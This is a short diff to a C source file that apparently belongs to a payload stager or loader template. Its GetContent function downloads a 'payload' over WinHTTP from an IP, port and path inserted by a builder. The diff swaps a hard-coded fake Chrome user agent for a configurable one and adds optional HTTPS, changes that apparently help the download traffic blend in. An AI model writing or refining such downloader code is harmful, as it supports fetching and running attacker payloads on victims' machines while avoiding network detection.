@@ -14,6 +14,8 @@
 #define IP		L"#-IP_VALUE-#"		// Changable
 #define PORT	#-PORT_VALUE-#		// Changable
 #define PATH	L"#-PATH_VALUE-#"	// Changable
+#define USE_HTTPS	#-USE_HTTPS-#	// 1 for HTTPS, 0 for HTTP
+#define USER_AGENT	L"#-USER_AGENT-#"
 
 
 BOOL GetContent(OUT PBYTE* pPayload,OUT SIZE_T* sSizeOfPayload) {
@@ -30,7 +32,7 @@ BOOL GetContent(OUT PBYTE* pPayload,OUT SIZE_T* sSizeOfPayload) {
 
 	// First opening an internet session
 	hSession = WinHttpOpen(
-		L"Mozilla/5.0 (Windows; U; Windows NT 10.3;; en-US) AppleWebKit/536.34 (KHTML, like Gecko) Chrome/47.0.3601.371 Safari/536",
+		USER_AGENT,
 		WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
 		WINHTTP_NO_PROXY_NAME,
 		WINHTTP_NO_PROXY_BYPASS,
@@ -54,8 +56,12 @@ BOOL GetContent(OUT PBYTE* pPayload,OUT SIZE_T* sSizeOfPayload) {
 		goto _CleanUp;
 	}
 	
-	// Creating the HTTP request 
-	hRequest = WinHttpOpenRequest(hConnect, NULL, path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_ESCAPE_DISABLE);
+	// Creating the HTTP/HTTPS request 
+	DWORD dwFlags = WINHTTP_FLAG_ESCAPE_DISABLE;
+	if (USE_HTTPS) {
+		dwFlags |= WINHTTP_FLAG_SECURE;
+	}
+	hRequest = WinHttpOpenRequest(hConnect, NULL, path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, dwFlags);
 
 	// Checking again
 	if (hRequest == NULL) {
